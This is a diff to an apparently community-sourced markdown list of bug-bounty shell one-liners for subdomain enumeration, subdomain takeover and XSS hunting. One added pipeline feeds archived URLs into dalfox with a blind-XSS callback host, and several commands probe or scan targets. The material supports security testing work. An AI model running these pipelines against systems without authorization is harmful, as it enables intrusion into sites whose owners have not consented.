@@ -31,6 +31,12 @@ cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | par
 gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
 ```
 
+> @fanimalikhack
+
+```bash
+ waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
+```
+
 ### Prototype Pollution
 > @R0X4R
 
@@ -63,7 +69,7 @@ shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " 
 > @D0cK3rG33k
 
 ```bash
-assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
+assetfinder --subs-only site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
 ```
 
 ### Extract Endpoints from JS File
@@ -93,6 +99,10 @@ curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -
 
 ```bash
 curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
+```
+> @AnubhavSingh_
+```bash
+curl "https://tls.bufferover.run/dns?q=$DOMAIN" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$DOMAIN"
 ```
 
 ### Get Subdomains from Riddler.io
@@ -215,7 +225,7 @@ for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxap
 > @hahwul
 
 ```bash
-subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
+subfinder -d {target} >> domains ; assetfinder --subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
 ```
 
 ### Get multiple target's Custom URLs from ParamSpider
@@ -368,3 +378,4 @@ cat urls.txt |qsreplace -a
 ```bash
 curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
 ```
+
